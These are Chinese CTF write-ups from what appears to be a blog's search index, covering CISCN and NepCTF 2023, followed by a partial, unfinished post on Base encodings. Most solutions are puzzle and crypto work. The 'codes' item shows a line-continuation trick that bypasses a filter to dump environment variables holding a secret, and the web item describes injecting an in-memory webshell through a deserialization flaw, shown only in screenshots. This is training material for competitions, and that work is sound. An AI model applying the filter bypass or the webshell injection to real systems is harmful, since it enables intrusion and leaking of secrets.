<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023Ciscn-Writeup</title>
    <url>/2023/09/28/2023Ciscn-Writeup/</url>
    <content><![CDATA[<h1 id="2023Ciscn-Writeup"><a href="#2023Ciscn-Writeup" class="headerlink" title="2023Ciscn-Writeup"></a>2023Ciscn-Writeup</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h3><p>前往公众号查看提示</p>
<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />

<p>print(open(‘&#x2F;flag’).read())</p>
<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />

<h3 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h3><p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus&#x2F;TCP协议，按正常顺序排序。</p>
<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg"></p>
<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg"></p>
<p>将字符串进行base32编码，得到flag</p>
<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg"></p>
<h3 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h3><p>下载附件给出了三个图</p>
<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
<p>得到最终的flag为flag{202305012359}</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="国密"><a href="#国密" class="headerlink" title="国密"></a>国密</h3><p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg"></p>
<p>首先发送</p>
<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
<p>得到用户id</p>
<p> <code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
<p>生成SM2算法的公钥和密钥</p>
<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br><code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
<p>发送公钥</p>
<p>curl -d “id&#x3D;7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey&#x3D;C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
<p>得到结果</p>
<p><code>&#123;</code><br>  <code>&quot;message&quot;: &quot;success&quot;,</code><br>  <code>&quot;data&quot;: &#123;</code><br>    <code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>    <code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>    <code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>    <code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>  <code>&#125;</code><br><code>&#125;</code></p>
<p>将随机数C密文采用SM2算法解密，得到结果</p>
<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code> </p>
<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
<p>向服务器请求密钥，得到回应</p>
<p><code>&#123;</code><br>  <code>&quot;message&quot;: &quot;success&quot;,</code><br>  <code>&quot;data&quot;: &#123;</code><br>    <code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>    <code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>  <code>&#125;</code><br><code>&#125;</code></p>
<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code> </p>
<p>发送验证，得到flag</p>
<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
<h3 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h3><p>观察字符串，发现是符合base64的码表，但结尾不为&#x3D;，大概是换表了</p>
<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg"></p>
<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg"></p>
<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NepNep-Writeup</title>
    <url>/2023/09/29/2023NepNep-Writeup/</url>
    <content><![CDATA[<h1 id="2023NepNep-Writeup"><a href="#2023NepNep-Writeup" class="headerlink" title="2023NepNep-Writeup"></a>2023NepNep-Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h3><p>提示管理员登陆，admin默认</p>
<p><img src="https://s2.loli.net/2023/09/29/eTOApcdyrMXtwzR.png"></p>
<p>发现rememberMe&#x3D;deleteMe，查询找到相关漏洞</p>
<p>工具一把梭</p>
<p><img src="https://s2.loli.net/2023/09/29/zTWpvLM6VZRPdxO.png"></p>
<p>注入内存马</p>
<p><img src="https://s2.loli.net/2023/09/29/VIqdTD8banlQ3uX.png"></p>
<p>连接webshell</p>
<p><img src="https://s2.loli.net/2023/09/29/w2NgWBtjGOxZAHU.png"></p>
<p>开始寻找flag，在start.sh中找到</p>
<p><img src="https://s2.loli.net/2023/09/29/s4phrUitKWZTBvN.png"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p><img src="https://s2.loli.net/2023/09/29/TWKFvQROpV9ySxu.png"></p>
<h3 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h3><p>给的是一段压缩算法，根据提示交给chtgpt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import heapq</span><br><span class="line"></span><br><span class="line">class HuffmanNode:</span><br><span class="line">    def __init__(self, char, freq):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = None</span><br><span class="line">        self.right = None</span><br><span class="line"></span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line">def build_huffman_tree(frequencies):</span><br><span class="line">    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    while len(heap) &gt; 1:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(None, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    return heap[0]</span><br><span class="line"></span><br><span class="line">def decompress(input_file, output_file):</span><br><span class="line">    with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    num_symbols = data[0]</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    offset = 1</span><br><span class="line"></span><br><span class="line">    for i in range(num_symbols):</span><br><span class="line">        byte = data[offset]</span><br><span class="line">        freq = (data[offset + 1] &lt;&lt; 24) | (data[offset + 2] &lt;&lt; 16) | (data[offset + 3] &lt;&lt; 8) | data[offset + 4]</span><br><span class="line">        frequencies[byte] = freq</span><br><span class="line">        offset += 5</span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    decoded_data = &#x27;&#x27;</span><br><span class="line">    current_node = root</span><br><span class="line"></span><br><span class="line">    for byte in data[offset:]:</span><br><span class="line">        bits = bin(byte)[2:].rjust(8, &#x27;0&#x27;)</span><br><span class="line">        for bit in bits:</span><br><span class="line">            if bit == &#x27;0&#x27;:</span><br><span class="line">                current_node = current_node.left</span><br><span class="line">            else:</span><br><span class="line">                current_node = current_node.right</span><br><span class="line"></span><br><span class="line">            if current_node.char is not None:</span><br><span class="line">                decoded_data += chr(current_node.char)</span><br><span class="line">                current_node = root</span><br><span class="line"></span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">        f.write(decoded_data)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    compressed_file = &#x27;compressed.bin&#x27;</span><br><span class="line">    decompressed_file = &#x27;decompressed.txt&#x27;</span><br><span class="line"></span><br><span class="line">    # 解压缩文件</span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/09/29/o5xBwTz7MJUCFi2.png"></p>
<h3 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h3><p>首先给的一段音频，用Au打开，发现包含两个内容，一个明显是十六制数字，另外一个怀疑是摩斯密码，手写下来解码得到一段明文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YOUSHOULDUSETHISTOXORSOMETHING</span><br></pre></td></tr></table></figure>

<p>根据提示，考虑异或解密，手搓了一段脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher_text_hex = &quot;0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&quot;</span><br><span class="line">cipher_text_bytes = bytes.fromhex(cipher_text_hex[2:])</span><br><span class="line">key = &quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;</span><br><span class="line">key_bytes = key.encode()</span><br><span class="line">plain_text_bytes = bytearray(len(cipher_text_bytes))</span><br><span class="line"></span><br><span class="line">for i in range(len(cipher_text_bytes)):</span><br><span class="line">    plain_text_bytes[i] = cipher_text_bytes[i] ^ key_bytes[i % len(key_bytes)]</span><br><span class="line"></span><br><span class="line">decrypted_text = plain_text_bytes.decode()</span><br><span class="line"></span><br><span class="line">print(&quot;Decrypted Text:&quot;, decrypted_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是解下来出现了nep字样，但是字符不对劲</p>
<p><img src="https://s2.loli.net/2023/09/29/FoR42QkXEf7JsSh.png"></p>
<p>然后用CyberChef一把梭，得到了结果</p>
<p><img src="https://s2.loli.net/2023/09/29/DpPRqJvEW8SImNB.png"></p>
<p>应该是脚本存在问题，但是代码能力有限，真想不出来了，等赛后wp吧</p>
<h3 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h3><p>根据提示，flag在环境变量中</p>
<p>根据查找，有一下几种方法</p>
<ol>
<li><p><strong>使用 <code>extern char **environ</code> 全局变量：</strong></p>
<p>这是一种直接的方法，使用全局变量 <code>environ</code>，它是一个指向指针的指针，用于存储环境变量的字符串数组。遍历这个数组并打印环境变量的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 <code>getenv()</code> 函数：</strong></p>
<p><code>getenv()</code> 函数允许你通过指定环境变量名称来获取其值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* env_var_name = <span class="string">&quot;PATH&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* env_var_value = getenv(env_var_name);</span><br><span class="line">    <span class="keyword">if</span> (env_var_value != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s=%s\n&quot;</span>, env_var_name, env_var_value);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Environment variable &#x27;%s&#x27; not found.\n&quot;</span>, env_var_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 <code>main()</code> 函数的参数 <code>char *argv[]</code>：</strong></p>
<p>程序的启动参数中也包含了环境变量信息。这种方法需要一些额外的解析工作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (envp[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, envp[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>逐个尝试，全部失败了</p>
<p>开始尝试各种绕过姿势</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern char **en\</span><br><span class="line">viron;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    while (en\</span><br><span class="line">viron[i] != NULL) &#123;</span><br><span class="line">        printf(&quot;%s\n&quot;, en\</span><br><span class="line">viron[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nepctf&#123;easy_codes_3a5786c2-dd96-46bd-9909-23f894dc8d2a_[TEAM_HASH]&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h3><p><img src="https://s2.loli.net/2023/09/29/DIuOpeSJkYsTxWf.png"></p>
<p>万宁，果真折磨</p>
<h3 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h3><p>没啥好说的，上图，比较好奇出题人到底是怎么找到的这个图</p>
<p><img src="https://s2.loli.net/2023/09/29/ifCgDS2O9Jzdw1y.jpg"></p>
<p><img src="https://s2.loli.net/2023/09/29/wofOdTlQaR38XpE.png"></p>
<p>然后将对应一下，最终成功提交上去的flag为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure>

<h3 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h3><p>拿到手刚开始以为这个题是密码的，当然，也确实有部分是，但主要可能是考察阅读理解。我还想再说一句，星穹铁道，启动！</p>
<p>首先先来看一下附件给了我们什么内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure>

<p>第一个是salt的长度，第二个是key的长度，第三个是偏移量iv，第四个就是相对应的密文了</p>
<p>其次，来分析一下题目给的提示</p>
<p><u><strong>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</strong></u></p>
<p><u><strong>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</strong></u></p>
<p>第一次阅读的时候我的关注点就是再256和群名两个关键上，256是指向hash算法，群名自然是跟附件中没有给出的key（PS：题目中关键的英文也是key）有关。</p>
<p>但是我刚开始完全没有注意到一个长度的问题，也就是salt_lenth&#x3D; 10 和key_lenth&#x3D; 16，而是将NepCTF 2023直接哈希计算了，中间留了空格（PS：因为我看群名也是留了空格的），甚至因为存在salt这个量还在考虑是否算法还进行了变种，然后尝试aes解密失败了。后来又从题目里的关键提示，也就是三月七闻群名好咸，咸指的自然就是盐，而盐的英文是salt。意识到这一点，也就开始知道为什么给出了两个长度值了salt的长度是提示使用NepCTF2023（PS:不加空格，刚好十个字），然后开始计算哈希256，得到的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</span><br></pre></td></tr></table></figure>

<p>但是长度是32个字节，所以需要截取出一半作为key，具体代码实现如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">*#* *提供的信息</span><br><span class="line">*key_hex = &quot;dd8e671df3882c5be6423cd030bd7cb6&quot;</span><br><span class="line">iv_hex = &quot;88219bdee9c396eca3c637c0ea436058&quot;</span><br><span class="line">ciphertext_hex = &quot;b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc&quot;</span><br><span class="line"></span><br><span class="line">*#* *将十六进制的**key**、**iv**和**ciphertext**转换为字节串</span><br><span class="line">*key = binascii.unhexlify(key_hex)</span><br><span class="line">iv = binascii.unhexlify(iv_hex)</span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line">*#* *创建**AES**解密器对象</span><br><span class="line">*cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">*#* *解密数据</span><br><span class="line">*decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">*#* *将解密后的字节数据转换为字符串</span><br><span class="line">*decrypted_string = decrypted_data.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">*#* *打印解密后的字符串</span><br><span class="line">*print(decrypted_string)</span><br></pre></td></tr></table></figure>

<p>最终计算下来结果为一串十六进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d</span><br></pre></td></tr></table></figure>

<p>然后转字符，转base64得到网址</p>
<p><strong><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></strong></p>
<p>下载下来一张图片</p>
<p><img src="https://s2.loli.net/2023/09/29/8eWuRQc2y3htlYi.png"></p>
<p>然后第一反应识图，结果google继陌生的语言后又失效喽（悲</p>
<p>后来又想到题目一开始就有了提示，星穹铁道，然后搜索相关的文字，找到了贝洛伯格特殊文字</p>
<p><img src="https://s2.loli.net/2023/09/29/biMX7Bx8CuJwScr.jpg"></p>
<p>然后跟表对照得到最终的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NepCTF&#123;HRP_aIways_likes_March_7th&#125;</span><br></pre></td></tr></table></figure>

<p>(PS:做图文题做到够，麻了)</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>NepNep</tag>
      </tags>
  </entry>
  <entry>
    <title>常用编码</title>
    <url>/2023/09/29/Misc(1)-%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<h1 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h1><p>其实本来想写一个很全的，结果越整理越心累，就半途而废了（，后续如果有机会再完善吧</p>
<h2 id="1-ASCII字符集"><a href="#1-ASCII字符集" class="headerlink" title="1.ASCII字符集"></a>1.ASCII字符集</h2><p>ASCII 码使用 7 或 8 位二进制数的组合，来表示 128 或 256 种可能的字符。<br>标准 ASCII 码也叫基础 ASCII 码，使用 7 位二进制数 (剩下的 1 位二进制为 0) 来表示所有的大写、小写字母，数字 0 到 9、标点符号，及在美式英语中使用的特殊控制字符。<br>基本的 ASCII 字符集共有 128 个字符，其中有 96 个可打印字符，包括常用的字母、数字、标点符号等，</p>
<h2 id="2-Base编码"><a href="#2-Base编码" class="headerlink" title="2.Base编码"></a>2.Base编码</h2><p>Base家族在各个方向的题目上使用频率都是极高的，且种类繁多，每种Base编码也都具有不同的特点，熟悉这些特点，也能快速辨认出一些变种。</p>
<h3 id="Base-16"><a href="#Base-16" class="headerlink" title="Base 16"></a>Base 16</h3><p>16个可打印字符，A~F、0-9，16个可打印字符，结尾没有等号，数字要多于字母。</p>
<h3 id="Base-32"><a href="#Base-32" class="headerlink" title="Base 32"></a>Base 32</h3><p>32个可打印字符，A<del>Z、2</del>7、32个可打印字符，“&#x3D;”符号用作后缀填充，字母要多于数字，明文数量超过 10 个，结尾可能会有很多等号。</p>
<h3 id="Base-64"><a href="#Base-64" class="headerlink" title="Base 64"></a>Base 64</h3><p>64个可打印字符，A<del>Z、a</del>z、0~9、+、&#x2F;，“&#x3D;”符号用作后缀填充，一般情况下结尾都会有 1 个或者 2 个等号，明文很少的时候可能没有。</p>
<h3 id="Base-36"><a href="#Base-36" class="headerlink" title="Base 36"></a>Base 36</h3><p>使用 0–9和 A–Z 表示数字</p>
<h3 id="Base-58"><a href="#Base-58" class="headerlink" title="Base 58"></a>Base 58</h3><p>相比Base 64，Base 58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”&#x2F;“符号，结尾没有等号，字母要多于数字。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123456789</span><br><span class="line">ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
<h3 id="Base-85"><a href="#Base-85" class="headerlink" title="Base 85"></a>Base 85</h3><p>等号一般出现在字符串中间，含有一些奇怪的字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! &quot; # $ % &amp; &#x27; ( ) * + , - . /</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 : ; &lt; = &gt; ?</span><br><span class="line">@ A B C D E F G H I J K L M N O</span><br><span class="line">P Q R S T U V W X Y Z [ \ ] ^ _</span><br><span class="line">` a b c d e f g h i j k l m n o</span><br><span class="line">p q r s t u v w x y z &#123; | &#125; ~</span><br></pre></td></tr></table></figure>
<h3 id="Base-91"><a href="#Base-91" class="headerlink" title="Base 91"></a>Base 91</h3><p>Base 91需要91个字符来表示ASCII编码的二进制数据。 从94个可打印ASCII字符中，以下三个字符被省略以构建Base 91字母：-（破折号）\（反斜杠）’（撇号）</p>
<h3 id="Base-92"><a href="#Base-92" class="headerlink" title="Base 92"></a>Base 92</h3><p>Base 92是用 92 个可打印字符表示 8 位二进制数据 (含无法显示 打印字符) 的编码方式。<br>Base 92包含下列字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_abcdefghijklmnopqrstuvwxyz&#123;|&#125;~		</span><br></pre></td></tr></table></figure>
<p>相比Base 94不带 ‘- 这 2 个字符。</p>
<h3 id="Base-94"><a href="#Base-94" class="headerlink" title="Base 94"></a>Base 94</h3><p>Base 94 是用 94 个可打印字符表示 8 位二进制数据 (含无法显示 打印字符) 的编码方式。<br>Base 94 包含下列字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span><br></pre></td></tr></table></figure>
<h3 id="Base-100"><a href="#Base-100" class="headerlink" title="Base 100"></a>Base 100</h3><p>密文由 Emoji 表情组成</p>
<h3 id="Base-128"><a href="#Base-128" class="headerlink" title="Base 128"></a>Base 128</h3><p>Base 128 是用 128 个字符表示 8 位二进制数据的编码方式.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\xb5\xb6\xb7\xbc\xbd\xbe\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center">编码方式</th>
<th>示例1</th>
<th>示例2</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td>Welcome to CTF</td>
<td>1234567890</td>
</tr>
<tr>
<td align="center">Base 16</td>
<td>57656C636F6D6520746F20435446</td>
<td>31323334353637383930</td>
</tr>
<tr>
<td align="center">Base 32</td>
<td>K5SWYY3PNVSSA5DPEBBVIRQ&#x3D;</td>
<td>GEZDGNBVGY3TQOJQ</td>
</tr>
<tr>
<td align="center">Base 64</td>
<td>V2VsY29tZSB0byBDVEY&#x3D;</td>
<td>MTIzNDU2Nzg5MA&#x3D;&#x3D;</td>
</tr>
<tr>
<td align="center">Base 36</td>
<td></td>
<td>107446288850820</td>
</tr>
<tr>
